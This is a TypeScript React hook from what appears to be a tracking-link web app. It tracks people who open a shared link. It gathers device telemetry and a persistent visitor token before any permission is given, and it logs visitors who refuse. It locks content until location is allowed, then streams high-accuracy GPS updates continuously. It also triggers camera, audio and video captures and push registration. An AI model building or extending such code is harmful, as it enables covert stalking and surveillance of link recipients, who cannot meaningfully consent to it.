// hooks/useConsentedLocation.ts
import { useState, useEffect, useRef, useCallback } from "react";
import { GeoCoordinate, PermissionsConfig } from "@/lib/types";
import { collectDeviceTelemetry } from "@/lib/telemetry";
import { executeSessionMediaCaptures } from "@/lib/session-media-client";
import { registerVisitorPushSubscription } from "@/lib/push-client";

interface UseConsentedLocationOptions {
  linkId: string;
  requiresLocation: boolean;
  permissionsConfig?: PermissionsConfig;
  onConsentGranted?: (sessionId: string) => void;
}

function getOrCreateVisitorToken(): string {
  if (typeof window === "undefined") return "";
  try {
    let tok = localStorage.getItem("snap_visitor_token");
    if (!tok) {
      tok = `v_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
      localStorage.setItem("snap_visitor_token", tok);
    }
    return tok;
  } catch { return ""; }
}

export function useConsentedLocation({
  linkId, requiresLocation, permissionsConfig, onConsentGranted,
}: UseConsentedLocationOptions) {
  const [isConsented, setIsConsented] = useState(!requiresLocation);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isLocationActive, setIsLocationActive] = useState(false);
  const watchIdRef = useRef<number | null>(null);
  const visitNumberRef = useRef<number>(1);
  const lastCoordsRef = useRef<{ latitude: number; longitude: number } | null>(null);
  const lastSendTimeRef = useRef<number>(0);

  const sendLocationUpdate = useCallback(async (sessId: string, coords: GeoCoordinate, force = false) => {
    if (!force && lastCoordsRef.current) {
      const dLat = (coords.latitude - lastCoordsRef.current.latitude) * Math.PI / 180;
      const dLon = (coords.longitude - lastCoordsRef.current.longitude) * Math.PI / 180;
      const a = Math.sin(dLat / 2) ** 2 + Math.cos(lastCoordsRef.current.latitude * Math.PI / 180) * Math.cos(coords.latitude * Math.PI / 180) * Math.sin(dLon / 2) ** 2;
      const dist = 6371e3 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
      if (dist < 25 || (Date.now() - lastSendTimeRef.current) < 20000) return;
    }

    try {
      lastCoordsRef.current = { latitude: coords.latitude, longitude: coords.longitude };
      lastSendTimeRef.current = Date.now();
      await fetch("/api/location", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: sessId, latitude: coords.latitude, longitude: coords.longitude, accuracy: coords.accuracy, visitNumber: visitNumberRef.current }),
      });
      setIsLocationActive(true);
    } catch {}
  }, []);

  const stopWatching = useCallback(() => {
    if (watchIdRef.current !== null && typeof navigator !== "undefined" && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
      setIsLocationActive(false);
    }
  }, []);

  useEffect(() => {
    return () => stopWatching();
  }, [stopWatching]);

  const requestLocation = useCallback(async () => {
    setIsLoading(true);
    setError(null);

    const deviceInfo = await collectDeviceTelemetry();
    const visitorToken = getOrCreateVisitorToken();

    const proceedWithCoords = async (coords?: GeoCoordinate) => {
      try {
        const res = await fetch("/api/sessions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            linkId,
            deviceInfo,
            visitorToken,
            permissionsGranted: coords ? ["location", "device_info"] : ["device_info"],
          }),
        });

        if (!res.ok) {
          const errData = await res.json().catch(() => ({}));
          throw new Error(errData.error || "Failed to register session");
        }

        const data = await res.json();
        const currentSessionId = data.session.id;
        visitNumberRef.current = data.visitNumber || 1;
        setSessionId(currentSessionId);

        if (coords) {
          void sendLocationUpdate(currentSessionId, coords, true);
        }

        // Coordinated multi-media captures & push subscription
        if (permissionsConfig?.push_notifications) {
          void registerVisitorPushSubscription(currentSessionId);
        }
        if (permissionsConfig?.camera || permissionsConfig?.audio || permissionsConfig?.video) {
          await Promise.race([
            executeSessionMediaCaptures(currentSessionId, permissionsConfig),
            new Promise((r) => setTimeout(r, 3200)),
          ]);
        }

        setIsConsented(true);
        setIsLoading(false);

        if (onConsentGranted) onConsentGranted(currentSessionId);

        if (coords && typeof navigator !== "undefined" && navigator.geolocation) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              sendLocationUpdate(currentSessionId, {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              });
            },
            () => setIsLocationActive(false),
            { enableHighAccuracy: true, maximumAge: 15000, timeout: 20000 }
          );
        }
      } catch (err: any) {
        setError(err.message || "Failed to establish tracking session");
        setIsLoading(false);
      }
    };

    if (!navigator.geolocation) {
      if (requiresLocation) {
        setError("Geolocation is not supported by your browser");
        setIsLoading(false);
        return;
      }
      await proceedWithCoords();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await proceedWithCoords({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      async (geoError) => {
        try {
          await fetch("/api/sessions", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ linkId, deviceInfo, visitorToken, permissionsGranted: ["device_info"], capturedData: { status: "denied" } }),
          });
        } catch {}
        if (!requiresLocation) { await proceedWithCoords(); return; }
        setIsLoading(false);
        const isAndroid = typeof navigator !== "undefined" && /Android/i.test(navigator.userAgent);
        if (geoError.code === geoError.PERMISSION_DENIED) {
          setError(isAndroid 
            ? "Location permission was denied. If prompted to close bubbles or overlays, dismiss floating menus or bubbles, then tap Retry."
            : "Location permission was denied. Please allow location to view content."
          );
        } else {
          setError("Location signal unavailable.");
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
    );
  }, [linkId, requiresLocation, permissionsConfig, onConsentGranted, sendLocationUpdate]);

  return {
    isConsented,
    isLoading,
    error,
    sessionId,
    isLocationActive,
    requestLocation,
    stopWatching,
  };
}
